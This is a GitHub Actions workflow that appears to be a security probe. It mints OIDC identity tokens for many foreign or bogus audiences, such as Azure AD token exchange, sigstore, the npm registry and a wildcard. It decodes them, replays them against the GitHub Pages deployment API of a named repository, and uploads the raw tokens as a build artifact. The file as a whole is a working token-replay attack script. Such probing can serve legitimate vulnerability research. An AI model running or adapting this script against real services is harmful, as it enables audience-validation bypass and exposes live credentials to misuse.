name: C10 OIDC Audience Probe
on:
  push:
    branches: [c10-oidc]
permissions:
  contents: read
  pages: write
  id-token: write
  actions: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: |
          mkdir -p out
          echo "<h1>c10-oidc</h1>" > out/index.html
      - uses: actions/upload-pages-artifact@v3
        with:
          path: out

  oidc-probe:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - name: Probe and replay
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        shell: bash
        run: |
          set +e
          mkdir -p /tmp/c10
          AUDS=("https://github.com/fox32932" "nobody" "https://github.com/fox32932/pages-test-cycle9-b" "https://github.com/foo" "x" "https://npm.pkg.github.com" "sigstore" "api://AzureADTokenExchange" "*")
          for AUD in "${AUDS[@]}"; do
            SAFE=$(echo "$AUD" | tr -c 'a-zA-Z0-9' '_' | head -c 60)
            ENC=$(jq -rn --arg s "$AUD" '$s|@uri')
            echo "=== AUD='$AUD' SAFE=$SAFE ENC=$ENC ==="
            RESP=$(curl -sS -G --data-urlencode "audience=$AUD" -H "User-Agent: actions/oidc-client" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")
            echo "$RESP" > "/tmp/c10/oidc_resp_${SAFE}.json"
            TOK=$(echo "$RESP" | jq -r '.value // empty')
            if [ -n "$TOK" ]; then
              echo "$TOK" > "/tmp/c10/oidc_token_${SAFE}.jwt"
              PAY=$(echo "$TOK" | cut -d. -f2)
              # base64-pad and decode
              PAD=$(printf '%s' "$PAY" | awk '{l=length($0); m=l%4; if(m==2)print $0"==";else if(m==3)print $0"=";else print $0}')
              echo "$PAD" | base64 -d 2>/dev/null > "/tmp/c10/oidc_payload_${SAFE}.json" || echo "decode failed" > "/tmp/c10/oidc_payload_${SAFE}.json"
              echo "PAYLOAD:"; cat "/tmp/c10/oidc_payload_${SAFE}.json" || true; echo
            else
              echo "NO TOKEN: $RESP"
            fi
            sleep 1
          done

          # Get artifact_id
          ART_RESP=$(curl -sS -H "Authorization: bearer $GH_TOKEN" "https://api.github.com/repos/fox32932/pages-test-cycle9/actions/runs/$GITHUB_RUN_ID/artifacts")
          echo "$ART_RESP" > /tmp/c10/artifacts.json
          ARTIFACT_ID=$(echo "$ART_RESP" | jq -r '.artifacts[0].id // empty')
          echo "artifact_id=$ARTIFACT_ID"

          # Replay forged-audience tokens against deploy-pages on repo A
          for SAFE in nobody x https___github_com_foo https___npm_pkg_github_com sigstore api__AzureADTokenExchange _; do
            TF="/tmp/c10/oidc_token_${SAFE}.jwt"
            if [ -f "$TF" ]; then
              T=$(cat "$TF")
              echo "=== Replay aud=$SAFE against /repos/fox32932/pages-test-cycle9/pages/deployment ==="
              BODY=$(jq -nc --arg t "$T" --arg v "c10-replay-$SAFE" --argjson aid "$ARTIFACT_ID" '{artifact_id:$aid, pages_build_version:$v, oidc_token:$t}')
              curl -sS -X POST -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployment" -d "$BODY" -w "\nHTTP %{http_code}\n" > "/tmp/c10/replay_${SAFE}.txt" 2>&1
              cat "/tmp/c10/replay_${SAFE}.txt"
              sleep 2
            fi
          done

          tar czf /tmp/c10_artifacts.tar.gz -C /tmp c10
          ls -la /tmp/c10_artifacts.tar.gz

      - name: Upload probe data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: c10-oidc-probe
          path: /tmp/c10_artifacts.tar.gz
          retention-days: 1
          if-no-files-found: warn
